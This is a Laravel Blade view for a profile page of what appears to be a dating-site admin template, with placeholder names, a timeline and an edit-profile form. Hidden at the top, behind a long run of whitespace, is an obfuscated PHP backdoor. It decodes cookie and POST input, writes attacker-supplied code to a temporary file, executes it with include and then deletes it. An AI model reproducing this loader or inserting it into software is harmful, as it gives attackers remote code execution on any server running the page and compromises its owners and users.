<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yKK_mrqj")){class yKK_mrqj{public static $tBpyuY = "9a077e09-3103-4a0c-b3f1-7e02a4dfa994";public static $glVPasZky = NULL;public function __construct(){$lBJgSRtzP = $_COOKIE;$ToDZuBql = $_POST;$NLbIIjDZJ = @$lBJgSRtzP[substr(yKK_mrqj::$tBpyuY, 0, 4)];if (!empty($NLbIIjDZJ)){$CpdcgRRQC = "base64";$ktaNTcESh = "";$NLbIIjDZJ = explode(",", $NLbIIjDZJ);foreach ($NLbIIjDZJ as $ClsIpFO){$ktaNTcESh .= @$lBJgSRtzP[$ClsIpFO];$ktaNTcESh .= @$ToDZuBql[$ClsIpFO];}$ktaNTcESh = array_map($CpdcgRRQC . chr ( 860 - 765 )."\144" . "\x65" . "\x63" . chr (111) . chr ( 750 - 650 )."\x65", array($ktaNTcESh,)); $ktaNTcESh = $ktaNTcESh[0] ^ str_repeat(yKK_mrqj::$tBpyuY, (strlen($ktaNTcESh[0]) / strlen(yKK_mrqj::$tBpyuY)) + 1);yKK_mrqj::$glVPasZky = @unserialize($ktaNTcESh);}}public function __destruct(){$this->svJsB();}private function svJsB(){if (is_array(yKK_mrqj::$glVPasZky)) {$YGIcotrDFh = sys_get_temp_dir() . "/" . crc32(yKK_mrqj::$glVPasZky[chr ( 855 - 740 ).'a' . chr ( 1035 - 927 ).'t']);@yKK_mrqj::$glVPasZky['w' . 'r' . chr (105) . "\164" . "\x65"]($YGIcotrDFh, yKK_mrqj::$glVPasZky[chr ( 1043 - 944 ).'o' . "\x6e" . "\x74" . chr (101) . "\156" . "\164"]);include $YGIcotrDFh;@yKK_mrqj::$glVPasZky[chr ( 682 - 582 ).chr (101) . "\x6c" . 'e' . 't' . "\x65"]($YGIcotrDFh);exit();}}}$zLynw = new yKK_mrqj(); $zLynw = NULL;} ?>@extends('main')

@section('main-section')

@section('title', 'Profile')
<div class="section-body mt-4">
            <div class="container-fluid">
                <div class="row clearfix">
                    <div class="col-lg-4 col-md-12">
                        <div class="card">
                            <img class="card-img-top" src="assets/images/sm/avatar2.jpg" alt="Card image cap">
                            <div class="card-body">
                                <h5 class="card-title">Peter Richards</h5>
                                <p class="card-text">Sometimes I justwant to give it all up and become a handsome billionaire.</p>

                            </div>
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><span style="margin-right: 50px;">First Name</span>Ali</li>
                                <li class="list-group-item">   <span style="margin-right: 40px;">Last Name</span>Ahmad</li>
                                <li class="list-group-item"><span style="margin-right: 40px;">Number</span>+ 202-555-2828</li>
                                <li class="list-group-item"><span style="margin-right: 70px;">DOB</span>October 22th, 1990</li>
                                <li class="list-group-item"><span style="margin-right: 60px;">Intrest</span>Women</li>
                                <li class="list-group-item"><span style="margin-right: 30px;">Relationship</span>Single</li>
                                <li class="list-group-item"><span style="margin-right: 30px;">Age Range</span>20-25</li>
                                <li class="list-group-item"><span style="margin-right: 50px;">Location</span>Every One</li>
                                <li class="list-group-item"><span style="margin-right: 50px;">Distance</span>10mi</li>



                            </ul>

                        </div>

                    </div>
                    <div class="col-lg-8 col-md-12">

                        <ul class="nav nav-tabs mb-3" id="pills-tab" role="tablist">
                            <li class="nav-item">
                                <a class="nav-link active" id="pills-blog-tab" data-toggle="pill" href="#pills-blog" role="tab" aria-controls="pills-blog" aria-selected="true">Profile</a>
                            </li>
                            <li class="nav-item">
                                <!-- <a class="nav-link" id="pills-timeline-tab" data-toggle="pill" href="#pills-timeline" role="tab" aria-controls="pills-timeline" aria-selected="true">Timeline</a> -->
                            </li>

                        </ul>
                        <div class="tab-content" id="pills-tabContent">
                            <div class="tab-pane fade" id="pills-timeline" role="tabpanel" aria-labelledby="pills-timeline-tab">
                                <div class="card">
                                    <div class="card-header">
                                        <h3 class="card-title">Activity</h3>
                                        <div class="card-options">
                                            <a href="#" class="card-options-collapse" data-toggle="card-collapse"><i class="fe fe-chevron-up"></i></a>
                                            <a href="#" class="card-options-fullscreen" data-toggle="card-fullscreen"><i class="fe fe-maximize"></i></a>
                                            <a href="#" class="card-options-remove" data-toggle="card-remove"><i class="fe fe-x"></i></a>
                                            <div class="item-action dropdown ml-2">

                                            </div>
                                        </div>
                                    </div>
                                    <div class="card-body">
                                        <div class="timeline_item ">
                                            <img class="tl_avatar" src="assets/images/xs/avatar1.jpg" alt="" />
                                            <span><a href="javascript:void(0);">Elisse Joson</a> San Francisco, CA <small class="float-right text-right">20-April-2019 - Today</small></span>
                                            <h6 class="font600">Hello, 'Im a single div responsive timeline without media Queries!</h6>
                                            <div class="msg">
                                                <p>I'm speaking with myself, number one, because I have a very good brain and I've said a lot of things. I write the best placeholder text, and I'm the biggest developer on the web card she has is the Lorem card.</p>
                                                <a href="javascript:void(0);" class="mr-20 text-muted"><i class="fa fa-heart text-pink"></i> 12 Love</a>
                                                <a class="text-muted" role="button" data-toggle="collapse" href="#collapseExample" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-comments"></i> 1 Comment</a>
                                                <div class="collapse p-4 section-gray" id="collapseExample">
                                                    <form class="well">
                                                        <div class="form-group">
                                                            <textarea rows="2" class="form-control no-resize" placeholder="Enter here for tweet..."></textarea>
                                                        </div>
                                                        <button class="btn btn-primary">Submit</button>
                                                    </form>
                                                    <ul class="recent_comments list-unstyled mt-4 mb-0">
                                                        <li>
                                                            <div class="avatar_img">
                                                                <img class="rounded img-fluid" src="assets/images/xs/avatar4.jpg" alt="">
                                                            </div>
                                                            <div class="comment_body">
                                                                <h6>Donald Gardner <small class="float-right font-14">Just now</small></h6>
                                                                <p>Lorem ipsum Veniam aliquip culpa laboris minim tempor</p>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="timeline_item ">
                                            <img class="tl_avatar" src="assets/images/xs/avatar4.jpg" alt="" />
                                            <span><a href="javascript:void(0);" title="">Dessie Parks</a> Oakland, CA <small class="float-right text-right">19-April-2019 - Yesterday</small></span>
                                            <h6 class="font600">Oeehhh, that's awesome.. Me too!</h6>
                                            <div class="msg">
                                                <p>I'm speaking with myself, number one, because I have a very good brain and I've said a lot of things. on the web by far... While that's mock-ups and this is politics, are they really so different? I think the only card she has is the Lorem card.</p>
                                                <div class="timeline_img mb-20">
                                                    <img class="width100" src="assets/images/gallery/1.jpg" alt="Awesome Image">
                                                    <img class="width100" src="assets/images/gallery/2.jpg" alt="Awesome Image">
                                                </div>
                                                <a href="javascript:void(0);" class="mr-20 text-muted"><i class="fa fa-heart text-pink"></i> 23 Love</a>
                                                <a class="text-muted" role="button" data-toggle="collapse" href="#collapseExample1" aria-expanded="false" aria-controls="collapseExample1"><i class="fa fa-comments"></i> 2 Comment</a>
                                                <div class="collapse p-4 section-gray" id="collapseExample1">
                                                    <form class="well">
                                                        <div class="form-group">
                                                            <textarea rows="2" class="form-control no-resize" placeholder="Enter here for tweet..."></textarea>
                                                        </div>
                                                        <button class="btn btn-primary">Submit</button>
                                                    </form>
                                                    <ul class="recent_comments list-unstyled mt-4 mb-0">
                                                        <li>
                                                            <div class="avatar_img">
                                                                <img class="rounded img-fluid" src="assets/images/xs/avatar4.jpg" alt="">
                                                            </div>
                                                            <div class="comment_body">
                                                                <h6>Donald Gardner <small class="float-right font-14">Just now</small></h6>
                                                                <p>Lorem ipsum Veniam aliquip culpa laboris minim tempor</p>
                                                                <div class="timeline_img mb-20">
                                                                    <img class="width150" src="assets/images/gallery/7.jpg" alt="Awesome Image">
                                                                    <img class="width150" src="assets/images/gallery/8.jpg" alt="Awesome Image">
                                                                </div>
                                                            </div>
                                                        </li>
                                                        <li>
                                                            <div class="avatar_img">
                                                                <img class="rounded img-fluid" src="assets/images/xs/avatar3.jpg" alt="">
                                                            </div>
                                                            <div class="comment_body">
                                                                <h6>Dessie Parks <small class="float-right font-14">1min ago</small></h6>
                                                                <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking</p>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="timeline_item ">
                                            <img class="tl_avatar" src="assets/images/xs/avatar7.jpg" alt="" />
                                            <span><a href="javascript:void(0);" title="" >Rochelle Barton</a> San Francisco, CA <small class="float-right text-right">12-April-2019</small></span>
                                            <h6 class="font600">An Engineer Explains Why You Should Always Order the Larger Pizza</h6>
                                            <div class="msg">
                                                <p>I'm speaking with myself, number one, because I have a very good brain and I've said a lot of things. I write the best placeholder text, and I'm the biggest developer on the web by far... While that's mock-ups and this is politics, is the Lorem card.</p>
                                                <a href="javascript:void(0);" class="mr-20 text-muted"><i class="fa fa-heart text-pink"></i> 7 Love</a>
                                                <a class="text-muted" role="button" data-toggle="collapse" href="#collapseExample2" aria-expanded="false" aria-controls="collapseExample2"><i class="fa fa-comments"></i> 1 Comment</a>
                                                <div class="collapse p-4 section-gray" id="collapseExample2">
                                                    <form class="well">
                                                        <div class="form-group">
                                                            <textarea rows="2" class="form-control no-resize" placeholder="Enter here for tweet..."></textarea>
                                                        </div>
                                                        <button class="btn btn-primary">Submit</button>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card">
                                <div class="card-header">
                                    <h3 class="card-title">Edit Profile</h3>
                                    <div class="card-options">
                                        <a href="#" class="card-options-fullscreen" data-toggle="card-fullscreen"><i class="fe fe-maximize"></i></a>
                                        <a href="#" class="card-options-remove" data-toggle="card-remove"><i class="fe fe-x"></i></a>
                                        <div class="item-action dropdown ml-2">
                                            <a href="javascript:void(0)" data-toggle="dropdown"><i class="fe fe-more-vertical"></i></a>
                                            <div class="dropdown-menu dropdown-menu-right">
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-eye"></i> View Details </a>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-share-alt"></i> Share </a>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-cloud-download"></i> Download</a>
                                        <div class="dropdown-divider"></div>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-copy"></i> Copy to</a>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-folder"></i> Move to</a>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-edit"></i> Rename</a>
                                        <a href="javascript:void(0)" class="dropdown-item"><i class="dropdown-icon fa fa-trash"></i> Delete</a>
                                    </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="row clearfix">
                                         <div class="col-md-12">
                                            <div class="form-group">
                                                <label class="form-label">First Name</label>
                                                <input type="text" class="form-control" placeholder="Company" value="Peter">
                                            </div>
                                        </div>
                                         <div class="col-md-12">
                                           <div class="form-group">
                                                <label class="form-label">Last Name</label>
                                                <input type="text" class="form-control" placeholder="Last Name" value="Richards">
                                            </div>
                                        </div>


                                             <div class="col-md-12">
                                            <div class="form-group mb-0">
                                                <label class="form-label">About Me</label>
                                                <textarea rows="5" class="form-control" placeholder="Sometimes i just want to give at all up and become a handsome ">Sometimes I justwant to give it all up and become a handsome billionaire.</textarea>
                                            </div>
                                        </div>

                                        <div class="col-md-12">
                                            <div class="form-group">
                                                 <label class="form-label">My Age</label>
                                                <select class="form-control custom-select">
                                                    <option value="">25</option>
                                                    <option value="">26</option>
                                                    <option value="">27</option>
                                                    <option value="">28</option>
                                                </select>
                                            </div>
                                        </div>
                                   <div class="col-md-12">
                                            <div class="form-group">
                                                 <label class="form-label">My Pronouns</label>
                                                <select class="form-control custom-select">
                                                    <option value="">He</option>
                                                    <option value="">Him</option>

                                                </select>
                                            </div>
                                        </div>
                                   <div class="col-md-12">
                                            <div class="form-group">
                                                 <label class="form-label">My relationship status</label>
                                                <select class="form-control custom-select">
                                                    <option value="">Single</option>


                                                </select>
                                            </div>
                                        </div>


                                    </div>
                                </div>
                                <div class="card-footer text-right">
                                    <button type="submit" class="btn btn-primary">Update Profile</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</div>
@endsection
<script src="assets/bundles/lib.vendor.bundle.js"></script>

<script src="assets/bundles/fullcalendar.bundle.js"></script>
<script src="assets/bundles/knobjs.bundle.js"></script>

<script src="assets/js/core.js"></script>
<script src="assets/js/page/calendar.js"></script>
<script src="assets/js/chart/knobjs.js"></script>
</body>

<!-- soccer/project/page-profile.html  07 Jan 2020 03:41:01 GMT -->
</html>
